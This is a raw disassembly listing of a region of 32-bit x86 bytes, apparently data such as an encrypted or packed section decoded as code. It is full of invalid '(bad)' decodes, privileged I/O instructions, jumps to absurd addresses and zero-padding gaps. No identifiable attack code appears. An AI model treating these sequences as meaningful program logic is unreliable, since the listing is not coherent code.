  42fa9e:	icebp  
  42fa9f:	and    esp,DWORD PTR ds:0xcd0dfc01
  42faa5:	repz addr16 xchg esi,eax
  42faa8:	or     ch,BYTE PTR [esi+ecx*4-0x71d39fe2]
  42faaf:	(bad)  
  42fab0:	jge    0x42fb1d
  42fab2:	mov    ch,0x7f
  42fab4:	arpl   WORD PTR ss:[edx+0x2d],cx
  42fab8:	cmp    ch,cl
  42faba:	ja     0x42fb06
  42fabc:	cmp    DWORD PTR [edx],edi
  42fabe:	inc    ecx
  42fabf:	xchg   edx,eax
  42fac0:	scas   eax,DWORD PTR es:[edi]
	...
  42fb31:	add    BYTE PTR [eax],al
  42fb33:	add    BYTE PTR [esi+0x41],bh
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	gs cld 
  42fb42:	jl     0x42fb59
  42fb44:	inc    edx
  42fb45:	test   DWORD PTR [ecx],0xf500
  42fb4b:	add    al,bh
  42fb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fb4e:	sbb    al,0x63
  42fb50:	cli    
  42fb51:	enter  0x9dc3,0x69
  42fb55:	xchg   edx,eax
  42fb56:	pusha  
  42fb57:	push   edi
  42fb58:	mov    eax,0x35f871b5
  42fb5d:	call   0xf0c527c2
  42fb62:	xchg   ebp,eax
  42fb63:	mov    gs,WORD PTR [esi+0x16d58591]
  42fb69:	jg     0x42fbc8
  42fb6b:	push   ebp
  42fb6c:	mov    ch,0x61
  42fb6e:	dec    ebx
  42fb6f:	cmp    dl,BYTE PTR [ebx]
  42fb71:	mul    BYTE PTR [ebx]
  42fb73:	adc    BYTE PTR [edi-0x36b692e0],ah
  42fb79:	jle    0x42faff
  42fb7b:	mov    ds:0x2fca937b,eax
  42fb80:	xchg   ebx,eax
  42fb81:	sub    ch,BYTE PTR [edi+0xea8d63f]
  42fb87:	adc    BYTE PTR [edx+0x1e69114a],cl
  42fb8d:	jne    0x42fb78
  42fb8f:	idiv   BYTE PTR [edi-0x794187fd]
  42fb95:	or     eax,0x8da51d45
  42fb9a:	ret    0x19e9
  42fb9d:	or     al,0x3a
  42fb9f:	or     bh,BYTE PTR [esi+0x44]
  42fba2:	jnp    0x42fbbd
  42fba4:	enter  0x6743,0x1a
  42fba8:	stos   BYTE PTR es:[edi],al
  42fba9:	nop
  42fbaa:	add    DWORD PTR [ecx],esi
  42fbac:	aam    0x58
  42fbae:	es push 0x63
  42fbb1:	retf   
  42fbb2:	test   ax,0x36df
  42fbb6:	dec    ecx
  42fbb7:	push   0x1a
  42fbb9:	fwait
  42fbba:	test   BYTE PTR [edx+0x481fb974],dl
  42fbc0:	push   esp
  42fbc1:	rcr    BYTE PTR [ebx+0x4cbcacbe],cl
  42fbc7:	adc    eax,DWORD PTR [ecx-0x30]
  42fbca:	mov    ah,0xb8
  42fbcc:	cwde   
  42fbcd:	scas   al,BYTE PTR es:[edi]
  42fbce:	mov    esi,0x6aba37ea
  42fbd3:	test   DWORD PTR [eax],esp
  42fbd5:	or     ah,bl
  42fbd7:	scas   al,BYTE PTR es:[edi]
  42fbd8:	lods   eax,DWORD PTR ds:[esi]
  42fbd9:	jmp    0xbfa31b44
  42fbde:	repnz (bad) 
  42fbe0:	lock lahf 
  42fbe2:	ja     0x42fb8e
  42fbe4:	or     al,BYTE PTR [ebx-0x72]
  42fbe7:	(bad)  
  42fbe8:	addr16 inc edx
  42fbea:	fs sbb eax,0x3398ea17
  42fbf0:	aad    0x5b
  42fbf2:	add    BYTE PTR [ebx],ch
  42fbf4:	sbb    al,bl
  42fbf6:	lods   al,BYTE PTR ds:[esi]
  42fbf7:	xchg   ebp,eax
  42fbf8:	cmc    
  42fbf9:	ins    DWORD PTR es:[edi],dx
  42fbfa:	aaa    
  42fbfb:	cmc    
  42fbfc:	mov    eax,0xe8076c99
  42fc01:	lds    esp,FWORD PTR [ecx]
  42fc03:	ret    0xe0de
  42fc06:	aam    0xe5
  42fc08:	mov    eax,DWORD PTR [edi+0x4f]
  42fc0b:	out    dx,al
  42fc0c:	lahf   
  42fc0d:	mov    esp,esi
  42fc0f:	cld    
  42fc10:	js     0x42fbc1
  42fc12:	xor    bl,cl
  42fc14:	into   
  42fc15:	jae    0x42fc57
  42fc17:	jg     0x42fc36
  42fc19:	mov    ebp,0x9057fb49
  42fc1e:	retf   0x8b22
  42fc21:	(bad)
  42fc25:	push   eax
  42fc26:	in     eax,0x29
  42fc28:	or     al,0x93
  42fc2a:	outs   dx,DWORD PTR ds:[esi]
  42fc2b:	outs   dx,DWORD PTR ds:[esi]
  42fc2c:	mov    dh,0xc0
  42fc2e:	popf   
  42fc2f:	popf   
  42fc30:	loop   0x42fcac
  42fc32:	pop    ds
  42fc33:	ret    
  42fc34:	mov    edi,0x716b88f2
  42fc39:	out    dx,al
  42fc3a:	xchg   esi,eax
  42fc3b:	enter  0xfdad,0x5c
  42fc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc40:	and    DWORD PTR [eax],eax
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0xee516b9
  42fcc3:	sub    esi,DWORD PTR [edi]
  42fcc5:	clc    
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	cmc    
  42fcc9:	add    BYTE PTR [eax],al
  42fccb:	add    BYTE PTR [eiz*4-0x15a9693f],ah
  42fcd2:	aaa    
  42fcd3:	dec    ebx
  42fcd4:	loope  0x42fc9a
  42fcd6:	icebp  
  42fcd7:	cmp    dh,al
  42fcd9:	or     dl,bh
  42fcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcdc:	add    DWORD PTR [edx],0xfd4f19b3
  42fce2:	dec    esp
  42fce3:	gs xor eax,0x5c99a2fe
  42fce9:	inc    edi
  42fcea:	mov    ch,0x10
  42fcec:	shl    DWORD PTR [ebx+ecx*2+0x255a6bc1],0xca
  42fcf4:	rol    BYTE PTR [ecx+0x33df7813],cl
  42fcfa:	jle    0x42fd7b
  42fcfc:	jl     0x42fd29
  42fcfe:	popa   
  42fcff:	jns    0x42fcd9
  42fd01:	jecxz  0x42fd6e
  42fd03:	push   ebx
  42fd04:	mul    BYTE PTR [ecx+eiz*8]
  42fd07:	data16 and ah,BYTE PTR ds:0xb03d9275
  42fd0e:	mov    ah,0x7d
  42fd10:	jle    0x42fd11
  42fd12:	fld    DWORD PTR [edx-0x28dd4673]
  42fd18:	ss mov edi,0x3c1b4481
  42fd1e:	and    DWORD PTR [esi],edi
  42fd20:	mov    ch,0x19
  42fd22:	jnp    0x42fd86
  42fd24:	(bad)  
  42fd25:	(bad)  
  42fd26:	fdivr  st,st(2)
  42fd28:	addr16 mov bl,0xd8
  42fd2b:	add    ebx,DWORD PTR [esi-0x4c5bc2d4]
  42fd31:	cmp    al,0xd
  42fd33:	mov    ah,0x99
  42fd35:	sub    BYTE PTR [edi-0x1a],bl
  42fd38:	bound  edx,QWORD PTR [edi+0x32977b97]
  42fd3e:	or     bh,BYTE PTR [ebx-0x784a8a8d]
  42fd44:	cwde   
  42fd45:	cld    
  42fd46:	or     edx,DWORD PTR [ebx-0x2ea93ac3]
  42fd4c:	or     eax,0x9c599ffd
  42fd51:	ds jae 0x42fd75
  42fd54:	fnsave [esi+eiz*2+0x12]
  42fd58:	jae    0x42fd1d
  42fd5a:	sar    ch,1
  42fd5c:	loope  0x42fda8
  42fd5e:	dec    DWORD PTR [ebx]
  42fd60:	inc    ebp
  42fd61:	sub    al,0x53
  42fd63:	inc    esp
  42fd64:	daa    
  42fd65:	mov    al,ds:0x51128614
  42fd6a:	jcxz   0x42fd68
  42fd6d:	icebp  
  42fd6e:	sbb    DWORD PTR [ecx-0x4e557026],ebp
  42fd74:	dec    edx
  42fd75:	ins    BYTE PTR es:[edi],dx
  42fd76:	inc    ebx
  42fd77:	mov    al,ds:0x83f4844a
  42fd7c:	xor    DWORD PTR [ecx-0x61],0xd78eb179
  42fd83:	cmp    al,0xef
  42fd85:	rcl    al,cl
  42fd87:	lock aaa 
  42fd89:	jl     0x42fd2f
  42fd8b:	mul    edx
  42fd8d:	stos   DWORD PTR es:[edi],eax
  42fd8e:	adc    ecx,edx
  42fd90:	adc    eax,0xaf4248d7
  42fd95:	push   ebx
  42fd96:	sub    edx,DWORD PTR [ebp-0x24]
  42fd99:	sub    BYTE PTR [edi+0x25],0x1f
  42fd9d:	xchg   edi,eax
  42fd9e:	xor    eax,edi
  42fda0:	inc    ebp
  42fda1:	push   es
  42fda2:	(bad)  
  42fda3:	or     DWORD PTR [edi],edx
  42fda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fda6:	add    DWORD PTR [ecx],ebp
  42fda8:	lea    ebx,[esi]
  42fdaa:	sub    BYTE PTR ds:0xc02b4f65,0x9c
  42fdb1:	leave  
  42fdb2:	jne    0x42fe30
  42fdb4:	sub    eax,0xf678b720
  42fdb9:	push   cs
  42fdba:	cld    
  42fdbb:	add    BYTE PTR [ecx+esi*2],al
  42fdbe:	xchg   esi,eax
  42fdbf:	mov    edi,0x6f
	...
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	fucomp st(2)
  42fe42:	xor    dh,ch
  42fe44:	sub    al,0xf9
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	cmc    
  42fe49:	add    BYTE PTR [eax],al
  42fe4b:	add    bl,ch
  42fe4d:	mov    bh,0xad
  42fe4f:	fs (bad) 
  42fe51:	mov    eax,ds:0x4394a45f
  42fe56:	jecxz  0x42fe4d
  42fe58:	xchg   DWORD PTR [ebx+0x7593279b],esp
  42fe5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fe5f:	inc    ebp
  42fe60:	imul   esp,ecx,0xfffffffb
  42fe63:	xchg   ebp,eax
  42fe64:	std    
  42fe65:	popf   
  42fe66:	imul   eax,DWORD PTR [edi-0x18],0x3d8d9012
  42fe6d:	jns    0x42fe83
  42fe6f:	xor    al,0x8e
  42fe71:	sbb    edi,ebx
  42fe73:	cmc    
  42fe74:	add    BYTE PTR [edi],bh
  42fe76:	dec    eax
  42fe77:	adc    ebp,DWORD PTR [ecx+0x79]
  42fe7a:	mov    cl,0x84
  42fe7c:	inc    edi
  42fe7d:	outs   dx,DWORD PTR ds:[esi]
  42fe7e:	out    dx,eax
  42fe7f:	pusha  
  42fe80:	iret   
  42fe81:	sbb    ch,BYTE PTR [ebx+0x113ee7eb]
  42fe87:	clc    
  42fe88:	stos   BYTE PTR es:[edi],al
  42fe89:	popf   
  42fe8a:	leave  
  42fe8b:	fwait
  42fe8c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  42fe8e:	mov    cl,0xb1
  42fe90:	and    BYTE PTR [ebp-0x150e2852],bl
  42fe96:	xchg   ah,bh
  42fe98:	in     eax,0x45
  42fe9a:	or     bh,BYTE PTR [ecx]
  42fe9c:	mov    esi,0x49fb58fe
  42fea1:	push   ds
  42fea2:	je     0x42fefb
  42fea4:	(bad)  
  42fea5:	js     0x42feec
  42fea7:	jo     0x42fede
  42fea9:	mov    edx,0xd2da9e74
  42feae:	lock sbb dh,BYTE PTR ds:0x803f9f9a
  42feb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42feb6:	imul   ebp,DWORD PTR [esi],0xffffff88
  42feb9:	shr    BYTE PTR fs:[ebp+0x3c],0x71
  42febe:	mov    al,0x19
  42fec0:	sub    DWORD PTR [edi+0x64e985fa],ecx
  42fec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fec7:	mov    eax,ds:0xa54c228c
  42fecc:	cmp    al,0x47
  42fece:	inc    ecx
  42fecf:	and    dl,BYTE PTR [eax-0x35243568]
  42fed5:	fstp   TBYTE PTR [edx+ecx*2-0x29]
  42fed9:	or     edi,DWORD PTR [ecx]
  42fedb:	mov    ebx,0xd2a3c539
  42fee0:	mov    bl,0x77
  42fee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fee3:	pushf  
  42fee4:	mov    bh,dl
  42fee6:	inc    edx
  42fee7:	dec    ecx
  42fee8:	sbb    eax,0x9a5ae66f
  42feed:	pushf  
  42feee:	popa   
  42feef:	push   esp
  42fef0:	cmp    ebp,edx
  42fef2:	aad    0xc7
  42fef4:	jle    0x42feb6
  42fef6:	mov    bl,0x88
  42fef8:	mov    bl,0x62
  42fefa:	fdivr  DWORD PTR [ebp-0x46c6d8d6]
  42ff00:	gs mov esi,0xaa1cdd1
  42ff06:	dec    edx
  42ff07:	popa   
  42ff08:	mov    bl,0xad
  42ff0a:	pop    es
  42ff0b:	leave  
  42ff0c:	dec    edi
  42ff0d:	dec    edx
  42ff0e:	cmp    bl,BYTE PTR [edi+eiz*8+0x29]
  42ff12:	sti    
  42ff13:	inc    esp
  42ff14:	jl     0x42feb4
  42ff16:	pop    es
  42ff17:	(bad)  
  42ff18:	jecxz  0x42ff89
  42ff1a:	mov    bl,0xc2
  42ff1c:	dec    esi
  42ff1d:	push   edx
  42ff1e:	xchg   esp,eax
  42ff1f:	pushf  
  42ff20:	xchg   esi,eax
  42ff21:	push   esi
  42ff22:	xor    cl,ch
  42ff24:	inc    edi
  42ff25:	shr    cl,0x68
  42ff28:	or     esp,DWORD PTR [ebp+0x66fd9c16]
  42ff2e:	(bad)  
  42ff2f:	std    
  42ff30:	dec    ebx
  42ff31:	imul   ebx,DWORD PTR [edx+0x23],0xffffffc4
  42ff35:	loope  0x42fede
  42ff37:	mov    bl,0x83
  42ff39:	ss mov ebx,ebp
  42ff3c:	cwde   
  42ff3d:	pop    ebx
  42ff3e:	jmp    0x0:0x35a2
	...
  42ffb1:	add    BYTE PTR [eax],al
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x63768016]
  42ffc1:	gs cld 
  42ffc3:	or     DWORD PTR [ecx],esp
  42ffc5:	cli    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	cmc    
  42ffc9:	add    BYTE PTR [eax],al
  42ffcb:	add    BYTE PTR [ebp-0x11a43568],dh
  42ffd1:	test   eax,0x6bef55dc
  42ffd6:	xor    eax,0x80d639b9
  42ffdb:	inc    esi
  42ffdc:	shl    DWORD PTR [ecx-0x46],0x34
  42ffe0:	dec    ecx
  42ffe1:	add    al,BYTE PTR [esi]
  42ffe3:	nop
  42ffe4:	js     0x430030
  42ffe6:	sti    
  42ffe7:	jecxz  0x430008
  42ffe9:	and    BYTE PTR [esi-0x1bdefb69],0x2a
  42fff0:	(bad)  
  42fff1:	bound  ecx,QWORD PTR [ecx+0x6a]
  42fff4:	mov    eax,ds:0xf41f649f
  42fff9:	and    bl,bl
  42fffb:	xchg   ebx,eax
  42fffc:	bound  edi,QWORD PTR [ecx-0x62]
  42ffff:	jb     0x43001e
  430001:	cmp    DWORD PTR [esi+esi*4-0x7c],0xffffffbf
  430006:	or     ch,BYTE PTR [edx-0x720a3326]
  43000c:	push   edi
  43000d:	mov    bh,BYTE PTR [edi-0x55]
  430010:	add    al,dh
  430012:	push   ecx
  430013:	inc    edx
  430014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430015:	loopne 0x430030
  430017:	and    esp,DWORD PTR [edi+0x8670dfc]
  43001d:	fisubr WORD PTR [edi+eiz*1+0x7]
  430021:	test   eax,0x8cca98f8
  430026:	mov    DWORD PTR [ecx+0x1],ebx
  430029:	scas   eax,DWORD PTR es:[edi]
  43002a:	dec    esp
  43002b:	mov    al,ds:0x47798ec
  430030:	cdq    
  430031:	xlat   BYTE PTR ds:[ebx]
  430032:	and    al,0x2f
  430035:	ret    
  430036:	mov    ch,0x1e
  430038:	in     eax,0xb5
  43003a:	jns    0x42ffd3
  43003c:	inc    edx
  43003d:	xchg   BYTE PTR [eax+0x77d762fc],dh
  430043:	sbb    BYTE PTR [ebx+esi*8+0x29],bl
  430047:	pop    ss
  430048:	ds mov bh,0xae
  43004b:	and    eax,DWORD PTR [edx]
  43004d:	mov    ds:0x3b1f003e,eax
  430052:	jmp    0x61c881fc
  430057:	xchg   ebp,eax
  430058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430059:	dec    ebx
  43005a:	cs cli 
  43005c:	out    0x99,al
  43005e:	scas   eax,DWORD PTR es:[edi]
  43005f:	sahf   
  430060:	jmp    0xf2b506d6
  430065:	hlt    
  430066:	test   eax,0xede834d
  43006b:	xor    ebx,edi
  43006d:	add    bh,BYTE PTR [edx-0x55d72031]
  430073:	gs shl al,cl
  430076:	add    bl,BYTE PTR [edi]
  430078:	icebp  
  430079:	mov    ds:0x8faf4db8,al
  43007e:	imul   ebp,DWORD PTR [ebx+0x1b],0xffffffd7
  430082:	jp     0x430025
  430084:	lods   al,BYTE PTR ds:[esi]
  430085:	popf   
  430086:	jge    0x4300ec
  430088:	inc    edx
  430089:	add    ch,al
  43008b:	bound  eax,QWORD PTR [eax+eax*8+0x32]
  43008f:	or     ebp,esi
  430091:	sub    al,0xca
  430093:	imul   edi,DWORD PTR [edi],0x31
  430096:	sub    DWORD PTR [ebx-0x54],0x9bc60bd7
  43009d:	fs iret 
  43009f:	out    dx,al
  4300a0:	push   eax
  4300a1:	xchg   edx,eax
  4300a2:	inc    esp
  4300a3:	and    eax,0xe1f3b55c
  4300a8:	adc    ecx,DWORD PTR [ebx+0xd]
  4300ab:	iret   
  4300ac:	and    bl,al
  4300ae:	(bad)  
  4300af:	jno    0x43012d
  4300b1:	arpl   di,ax
  4300b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4300b4:	mov    ch,0xf1
  4300b6:	ficom  DWORD PTR [ebx]
  4300b8:	(bad)  
  4300b9:	cmp    BYTE PTR ds:0x290894db,dl
  4300bf:	fisubr DWORD PTR [edi+0x0]
	...
  430131:	add    BYTE PTR [eax],al
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x9aae:0x5fd3a608
  430144:	push   ss
  430145:	sti    
  430146:	add    DWORD PTR [eax],eax
  430148:	cmc    
  430149:	add    BYTE PTR [eax],al
  43014b:	add    BYTE PTR [eax+edi*4],cl
  43014e:	out    0x37,al
  430150:	mov    esi,0x15e793fc
  430155:	call   0x5c2fb59f
  43015a:	rol    BYTE PTR [ebx-0x4d04f6c7],cl
  430160:	ja     0x43010a
  430162:	jecxz  0x4300f2
  430164:	jecxz  0x430107
  430166:	or     al,0xe5
  430168:	call   0x48e2:0x73045654
  43016f:	outs   dx,BYTE PTR ds:[esi]
  430170:	inc    ebx
  430171:	cmp    al,0xb8
  430174:	bound  eax,QWORD PTR [edi+0x46]
  430177:	jb     0x430189
  430179:	fmul   DWORD PTR [edx+esi*1+0x5e]
  43017d:	(bad)  
  43017e:	cdq    
  43017f:	aad    0x81
  430181:	das    
  430182:	mov    dh,0x59
  430184:	aas    
  430185:	jl     0x43012e
  430187:	call   0xa1ed3fd4
  43018c:	push   ecx
  43018d:	pop    ecx
  43018e:	ret    
  43018f:	mov    ch,0x43
  430191:	(bad)  
  430192:	repnz fwait
  430194:	cmp    ebx,eax
  430196:	dec    edx
  430197:	bound  edx,QWORD PTR [edx-0x148ad49c]
  43019d:	xchg   edx,eax
  43019e:	sub    eax,0x59b7fb4b
  4301a3:	(bad)  [ebx]
  4301a5:	mov    ss,WORD PTR [eax]
  4301a7:	or     DWORD PTR [esi-0x40b0ce0b],esi
  4301ad:	stc    
  4301ae:	add    DWORD PTR [ebx-0x69be1511],esi
  4301b4:	mov    edi,0x4302781c
  4301b9:	fidivr WORD PTR ds:[esi-0x37]
  4301bd:	shl    BYTE PTR ds:0xa5893b9a,1
  4301c3:	pop    eax
  4301c4:	fdiv   DWORD PTR [ebp+0x8]
  4301c7:	aaa    
  4301c8:	fs dec esi
  4301ca:	clc    
  4301cb:	outs   dx,BYTE PTR ds:[esi]
  4301cc:	jp     0x43023e
  4301ce:	pop    esi
  4301cf:	mov    al,ds:0x63eb050b
  4301d4:	sbb    edi,ecx
  4301d6:	mov    esi,0xbe5335f1
  4301db:	shl    DWORD PTR [esi+0x60],cl
  4301de:	sti    
  4301df:	lods   eax,DWORD PTR ds:[esi]
  4301e0:	into   
  4301e1:	aas    
  4301e2:	xor    DWORD PTR [edx-0x9],edx
  4301e5:	lds    eax,FWORD PTR [esi+0x4c14fbf3]
  4301eb:	mov    BYTE PTR [ebp+0x75],ah
  4301ee:	mov    ds:0xd9f2fa1f,eax
  4301f3:	add    eax,0x4774330e
  4301f8:	mov    esp,0x81c9745e
  4301fd:	les    eax,FWORD PTR [esi+0x79]
  430200:	sti    
  430201:	adc    ebx,DWORD PTR [esi-0x35dea4e1]
  430207:	mov    edi,0x47bd93ac
  43020c:	das    
  43020d:	cmp    bh,BYTE PTR [edi-0x6e]
  430210:	xchg   ecx,eax
  430211:	xchg   ecx,eax
  430212:	enter  0x7c7e,0xf6
  430216:	test   al,0x22
  430218:	pop    ss
  430219:	imul   edi,DWORD PTR [edx+edx*4+0x563871db],0x33
  430221:	retf   
  430222:	or     ah,BYTE PTR [edx+0x5c19e633]
  430228:	hlt    
  430229:	fst    QWORD PTR [edi]
  43022b:	bound  ebp,QWORD PTR [eax+ebx*8-0x4e]
  43022f:	iret   
  430230:	xor    eax,0xdbfb4b62
  430235:	mov    dh,BYTE PTR [ecx-0x7e]
  430238:	ss out dx,eax
  43023a:	fist   WORD PTR [eax]
  43023c:	mov    BYTE PTR [eax-0x7e],bh
  43023f:	in     al,dx
  430240:	sub    DWORD PTR [eax],eax
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	fnstsw WORD PTR [ecx-0x3f44ab0]
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	cmc    
  4302c9:	add    BYTE PTR [eax],al
  4302cb:	add    BYTE PTR [ebp+0x2c76eeaf],cl
  4302d1:	xchg   ecx,ebp
  4302d3:	mov    al,ds:0x13d4181f
  4302d8:	rol    DWORD PTR [ecx+0x6d],0xca
  4302dc:	pop    es
  4302dd:	loope  0x4302d1
  4302df:	lahf   
  4302e0:	sbb    edx,DWORD PTR [edi+0x4a]
  4302e3:	inc    esp
  4302e4:	shl    BYTE PTR [esi+0x6d],1
  4302e7:	les    esp,FWORD PTR [esp+edi*1-0x2]
  4302eb:	test   al,0xb
  4302ed:	jo     0x43033d
  4302ef:	popf   
  4302f0:	fcmove st,st(1)
  4302f2:	mov    cs,WORD PTR [edx+0x3f092540]
  4302f8:	cmp    ebp,DWORD PTR [edi+0x625c0cef]
  4302fe:	and    DWORD PTR [edi-0x38],eax
  430301:	mov    BYTE PTR [esi],dl
  430303:	pop    es
  430304:	jl     0x430371
  430306:	call   0xaa2f635e
  43030b:	leave  
  43030c:	repz sub al,0xd9
  43030f:	adc    ebx,DWORD PTR [edi-0x66b63bf4]
  430315:	pop    edx
  430316:	std    
  430317:	dec    esi
  430318:	pop    ss
  430319:	inc    edx
  43031a:	push   es
  43031b:	jb     0x4302b2
  43031d:	(bad)  
  43031e:	pop    eax
  43031f:	cwde   
  430320:	gs inc edi
  430322:	xchg   dl,bl
  430324:	lds    edi,FWORD PTR ds:0x4548d428
  43032a:	int3   
  43032b:	dec    esp
  43032c:	test   ch,0xe9
  43032f:	out    dx,al
  430330:	jecxz  0x4302f5
  430332:	mov    cs,eax
  430334:	shl    DWORD PTR ss:[esi+0x40a16286],1
  43033b:	mov    dh,BYTE PTR [edi-0x3f403128]
  430341:	lods   al,BYTE PTR ds:[esi]
  430342:	dec    eax
  430343:	mov    eax,0xe489e6cd
  430348:	mov    esi,0xb7d8b10d
  43034d:	or     dh,BYTE PTR [ebx]
  43034f:	popf   
  430350:	lahf   
  430351:	push   eax
  430352:	inc    edi
  430353:	out    dx,al
  430354:	ret    
  430355:	hlt    
  430356:	fnstcw WORD PTR [ebx+0x18]
  430359:	mov    eax,ds:0x980eb412
  43035e:	nop
  43035f:	in     eax,dx
  430360:	outs   dx,DWORD PTR ds:[esi]
  430361:	xchg   ebp,eax
  430362:	dec    edx
  430363:	xchg   ebx,esi
  430365:	xchg   esp,eax
  430366:	leave  
  430367:	xchg   esi,eax
  430368:	aam    0xf2
  43036a:	mov    edx,0xb85b283a
  43036f:	mov    ds:0xc6a48565,eax
  430374:	cmp    esp,ebp
  430376:	ret    0x8dc2
  430379:	mov    BYTE PTR [edi-0x3c],bh
  43037c:	mov    dh,0xc1
  43037e:	jl     0x430380
  430380:	scas   al,BYTE PTR es:[edi]
  430381:	xchg   ecx,eax
  430382:	adc    dh,BYTE PTR [edi+eiz*1+0x3c0fa7aa]
  430389:	xchg   esi,eax
  43038a:	xor    eax,0x687c149e
  43038f:	mov    ch,BYTE PTR [esp+edx*4-0x11]
  430393:	mov    BYTE PTR [ecx+ebx*4-0x761034c6],al
  43039a:	(bad)  
  43039b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43039c:	mov    esp,0x86a6dbb
  4303a1:	inc    esi
  4303a2:	xor    DWORD PTR ds:0x7e1e6359,ebp
  4303a8:	push   eax
  4303a9:	cmp    al,0x51
  4303ab:	out    0x3c,al
  4303ad:	pop    ebx
  4303ae:	lods   al,BYTE PTR ds:[esi]
  4303af:	fcomp  st(2)
  4303b1:	mov    bl,BYTE PTR ds:0xc58314e9
  4303b7:	xchg   esi,eax
  4303b8:	xor    BYTE PTR [ebx-0x7e],0xa0
  4303bc:	cmp    eax,0x72bd209e
	...
  430431:	add    BYTE PTR [eax],al
  430433:	add    BYTE PTR [edi],dh
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfd00:0xcf040ac0
  430446:	add    DWORD PTR [eax],eax
  430448:	cmc    
  430449:	add    BYTE PTR [eax],al
  43044b:	add    BYTE PTR [eax-0x49],ch
  43044e:	jge    0x4303d8
  430450:	or     edi,ebx
  430452:	ret    
  430453:	xor    al,0xe0
  430455:	in     eax,0x16
  430457:	sbb    DWORD PTR [esi],0x1b
  43045a:	data16 stc 
  43045c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43045d:	sbb    al,BYTE PTR [edx+0x4e]
  430460:	fcomp  DWORD PTR [edx]
  430462:	add    DWORD PTR [edi+edx*2-0x12],ebp
  430466:	inc    ebx
  430467:	gs call 0x76571311
  43046d:	dec    ebp
  43046e:	sub    ebx,DWORD PTR [edx+eax*1]
  430471:	add    BYTE PTR [edx],cl
  430473:	arpl   WORD PTR [edx],bp
  430475:	push   ebp
  430476:	ja     0x4304cf
  430478:	cwde   
  430479:	icebp  
  43047a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43047b:	inc    esi
  43047c:	and    DWORD PTR [esi],ebx
  43047e:	xor    al,0xb6
  430480:	cdq    
  430481:	xchg   esp,eax
  430482:	xor    DWORD PTR [edi-0x1debab50],ebx
  430488:	push   cs
  430489:	mov    bl,0xb6
  43048b:	jnp    0x430414
  43048d:	mov    bh,0x8e
  43048f:	mov    edi,0xda540bb9
  430494:	loopne 0x43047c
  430496:	mov    esi,0x887e978d
  43049b:	jne    0x430494
  43049d:	ss (bad) 
  43049f:	das    
  4304a0:	(bad)  
  4304a1:	fdiv   QWORD PTR [esi]
  4304a3:	jb     0x430439
  4304a5:	sub    eax,0x80408585
  4304aa:	inc    edi
  4304ab:	push   0xe2b0f05b
  4304b0:	sub    cl,ch
  4304b2:	jo     0x43045e
  4304b4:	aas    
  4304b5:	iret   
  4304b6:	sbb    eax,0x44d97143
  4304bb:	hlt    
  4304bc:	adc    DWORD PTR gs:[edx],edi
  4304bf:	pop    ebp
  4304c0:	add    ebp,ebp
  4304c2:	mov    cl,0xa5
  4304c4:	xor    eax,0x9dcbe9ea
  4304c9:	sbb    DWORD PTR [eax],ebx
  4304cb:	or     BYTE PTR [edx-0x2e],al
  4304ce:	jb     0x4304b7
  4304d0:	pop    ebx
  4304d1:	lods   eax,DWORD PTR ds:[esi]
  4304d2:	push   edx
  4304d3:	dec    edi
  4304d4:	out    0x96,al
  4304d6:	in     al,0x6a
  4304d8:	pop    ebp
  4304d9:	inc    ebx
  4304da:	cmp    ah,BYTE PTR [eax]
  4304dc:	fcmovb st,st(5)
  4304de:	cmp    dl,cl
  4304e0:	stos   DWORD PTR es:[edi],eax
  4304e1:	inc    ebp
  4304e2:	retf   0xf93e
  4304e5:	in     eax,dx
  4304e6:	mov    bh,0x77
  4304e8:	sbb    ebp,DWORD PTR [ecx+0x6d05817b]
  4304ee:	pcmpeqw mm3,mm3
  4304f1:	lgs    edi,FWORD PTR ds:0x81df9c50
  4304f8:	shr    BYTE PTR [ecx+0x1d],0xd5
  4304fc:	mov    ch,0x8
  4304fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4304ff:	mov    ch,0xbb
  430501:	cmp    al,0xdd
  430503:	std    
  430504:	sub    BYTE PTR [eax],bl
  430506:	pop    ecx
  430507:	inc    ebp
  430508:	fidivr DWORD PTR [eax+0x461f6fdd]
